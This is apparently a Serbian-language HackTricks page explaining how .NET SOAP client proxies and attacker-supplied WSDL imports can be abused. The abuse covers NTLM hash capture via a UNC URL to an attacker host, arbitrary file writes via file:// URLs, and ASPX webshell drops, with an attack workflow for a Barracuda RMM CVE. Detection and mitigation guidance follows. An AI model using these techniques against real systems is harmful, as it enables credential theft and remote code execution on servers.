# .NET SOAP/WSDL zloupotreba klijentskog proxyja

{{#include ../../banners/hacktricks-training.md}}

## TL;DR

- `SoapHttpClientProtocol`, `DiscoveryClientProtocol` i slični nasleđuju `HttpWebClientProtocol`, čiji `GetWebRequest()` vraća scheme-agnostic `WebRequest` instancu proizvedenu od strane `WebRequest.Create()` bez forsiranja `HttpWebRequest`.
- Ako napadač kontroliše proxy `Url`, framework tiho zamenjuje handler-e sa `FileWebRequest`, `FtpWebRequest` ili UNC/SMB handler-ima, pretvarajući "HTTP" proxy-je u NTLM leak gadgete ili proizvoljne pisce fajlova.
- Svaka funkcija koja uvozi WSDL koji obezbeđuje napadač putem `ServiceDescriptionImporter` pogoršava problem: WSDL kontroliše generisani konstruktor proxy-ja, SOAP metode, kompleksne tipove i namespace-ove, omogućavajući pre-auth RCE (webshell-ove, drop-ovanje skripti) u proizvodima poput Barracuda Service Center RMM, Ivanti EPM, Umbraco 8, PowerShell i SSIS.

## Root cause: HttpWebClientProtocol is scheme-agnostic

`WebClientProtocol.GetWebRequest()` radi `var req = WebRequest.Create(uri)` i vraća ga netaknutog. `HttpWebClientProtocol.GetWebRequest()` pokušava `req as HttpWebRequest` da bi podesio HTTP-only polja, ali **i dalje vraća originalni `req`** čak i kada cast ne uspe. Dakle runtime poštuje bilo koji scheme koji je prisutan u `Url`:

- `http(s)://` → `HttpWebRequest`
- `file:///` ili `\\host\share\` → `FileWebRequest`
- `ftp://` → `FtpWebRequest`

`SoapHttpClientProtocol.Invoke()` zatim stream-uje SOAP POST telo preko izabranog transport handler-a, čak i ako to znači upis na disk ili slanje preko SMB-a.

## Primitive 1 – NTLM capture / relay via UNC targets

1. Steknite kontrolu nad `SoapHttpClientProtocol.Url` (direktan setter, config vrednost, red u bazi, itd.).
2. Pokažite ga na UNC putanju kao `file://attacker.local/sink/payload`.
3. CLR otvara putanju preko SMB-a i izvodi integrated authentication, otkrivajući NTLM challenge/response napadaču.
4. Iskoristite uhvaćene hash-e za offline cracking ili NTLM relay (SMB/HTTP) ako signing/EPA nisu prisutni.

Ovo se odnosi na **bilo koji** .NET SOAP/HTTP proxy path koji prihvata korisnički unos, čak i ako nema daljih mogućnosti eksploatacije.

## Primitive 2 – Arbitrary file writes via `file://`

1. Postavite `Url = "file:///inetpub/wwwroot/poc.aspx"` (ili bilo koju writable putanju) pre proxy poziva.
2. Pozovite bilo koju SOAP metodu; framework upisuje ceo SOAP envelope u odabranu putanju, prepisujući postojeće fajlove.
3. Argumenti koje kontroliše korisnik pojavljuju se unutar XML elemenata, omogućavajući napadačima da drop-uju CSHTML/ASPX payload-e ili zatrovaju config fajlove.

Ograničenja:

- Sadržaj je uvek XML; scalar polja su entity-enkodirana, tako da injektovanje `<script>` preko običnih stringova zahteva dodatne trikove.
- Značajni payload-i zahtevaju bar jedan argument pod kontrolom napadača ili sposobnost izmene signatura metoda (vidi WSDL abuse).

Runtime često baca `Client found response content type of 'application/octet-stream', but expected 'text/xml'` nakon upisa — tretirajte ovu grešku kao IOC.

## Weaponizing WSDL imports

### Auto-generated proxies via `ServiceDescriptionImporter`

Mnogi proizvodi izlažu "custom web service" funkcionalnosti koje prihvataju WSDL URL, a zatim:

1. `ServiceDescription.Read()` napadač-kontrolisanog WSDL-a.
2. `ServiceDescriptionImporter` generiše C# proxy klase koje proširuju `SoapHttpClientProtocol`.
3. CodeDOM kompajlira proxy i reflection poziva traženu metodu.

Napadač u potpunosti kontroliše:

- `soap:address` / `soap12:address` `location` → postaje `base.Url` (može postaviti `file://` ili UNC putanje).
- Imena metoda, liste parametara, kompleksne tipove i serializere.
- Namespace URI-je koji se završavaju kao `xmlns:*` atributi u svakoj SOAP poruci.

Ne vrši se validacija scheme-a, tako da svaki generisani proxy nasledjuje originalnu dizajn manu.

### Shaping the SOAP envelope for RCE

- Complex type serialization: Definišite custom struct-ove u WSDL tako da kada `XmlSerializer` ponovo emituje te tipove, proizvedu elemente/atribute po izboru napadača. Za ASPX webshell drop-ove, skrojite tipove koji se serializuju u:
```xml
<script runat="server">
// payload pulling `Request.QueryString["cmd"]`
</script>
```
i postavite `Url` na `file:///.../webroot/shell.aspx` da biste dobili RCE.
- Namespace injection: Čak i kada su argumenti hard-kodovani (npr. Umbraco Forms), namespace-ovi deklarisani u WSDL-u (npr. `xmlns:tns="http://host/service?x=@{...}"`) se kopiraju verbatim u SOAP envelope. Kodovanje payload-a unutar namespace query string-a omogućava CSHTML Razor ili PowerShell script drop-ove bez kontrole nad parametrima.

Ove tehnike su pokretale Barracuda Service Center RMM exploit (CVE-2025-34392): neautentifikovani SOAP poziv isporučio je maliciozni WSDL, postavio `soap12:address` na `file:///Program Files/.../SCMessaging/poc.aspx`, ubacio `<script runat="server">` putem kompleksnih parametara i upload-ovao webshell koji je izvršavao proizvoljne `cmd.exe` komande.

## Typical attack workflow

1. Identifikujte funkcionalnost koja prihvata WSDL URL ili na drugi način omogućava korisnicima da konfigurišu SOAP endpoint-e (npr. Barracuda `InvokeRemoteMethod`, Ivanti EPM konektori, Umbraco 8 Forms datasource-i, PowerShell `New-WebServiceProxy`).
2. Host-ujte maliciozni WSDL čiji `soap:address` ukazuje na writable putanju ili UNC share i čiji schema definiše metode/tipove pogodne za payload.
3. Trigger-ujte import/kompilaciju. Meta generiše proxy DLL sa konstruktorom i metodama pod kontrolom napadača.
4. Kada aplikacija pozove generisanu metodu, SOAP zahtev se serializuje i upisuje na putanju specificiranu od strane napadača, ugrađujući payload.
5. Izvršite drop-ovani fajl (otvorite `poc.aspx?cmd=whoami`, učitajte CSHTML, ili dozvolite PowerShell-u da pokrene skriptu) ili ponovo iskoristite uhvaćeni NTLM materijal.

## Detection & hunting

- Static analysis: Grep-ujte za `ServiceDescriptionImporter`, `SoapHttpClientProtocol`, `HttpWebClientProtocol`, ili `New-WebServiceProxy`. Pratite kako su `Url` ili WSDL input-i izvorno dobijeni—bilo šta što je user-controlled je crveni flag.
- Runtime telemetry:
- Instrumentujte kreiranje proxy-ja da logujete scheme; alert-ujte na `file`, `ftp`, ili UNC vrednosti.
- Monitor-ujte karakteristične greške "Client found response content type of 'application/octet-stream'" nakon SOAP poziva.
- Pratite neočekivane `.aspx/.cshtml/.ps1` upise u direktorijumima aplikacije koje vrši identity web servisa.
- Network/file signali: SMB konekcije inicirane od strane web servera prema napadačkoj infrastrukturi, ili nagla kompilacija privremenih proxy DLL-ova, često prethode eksploataciji.

## Mitigations

- Enforce transport validation pre nego što pozovete bilo koji `HttpWebClientProtocol`-derived proxy:
```csharp
var uri = new Uri(proxy.Url);
if (uri.Scheme != Uri.UriSchemeHttp && uri.Scheme != Uri.UriSchemeHttps)
throw new InvalidOperationException("SOAP clients must stay on HTTP/S");
```
- Sanitize imported WSDL: Proxy download-ujte kroz broker koji prepisuje ili odbacuje `soap:address` unose koji nisu HTTP/S, ispušta nepoznate bindings, i zabranjuje namespace payload trikove.
- Disable untrusted WSDL features: Zamenite "upload a WSDL" pogodnosti sa vetted, server-side templating ili allowlist-ama.
- Segregate write locations: Osigurajte da app pool-ovi ne mogu pisati u izvršne direktorijume; koristite odvojene volumene za data vs. code tako da file-write primitive ne postanu RCE.
- Harden NTLM exposure: Onemogućite outbound SMB gde je moguće; inače primenite SMB signing, EPA i druge relay mitigacije.

## References

- [watchTowr Labs – SOAPwn: Pwning .NET Framework Applications Through HTTP Client Proxies and WSDL](https://labs.watchtowr.com/soapwn-pwning-net-framework-applications-through-http-client-proxies-and-wsdl/)

{{#include ../../banners/hacktricks-training.md}}
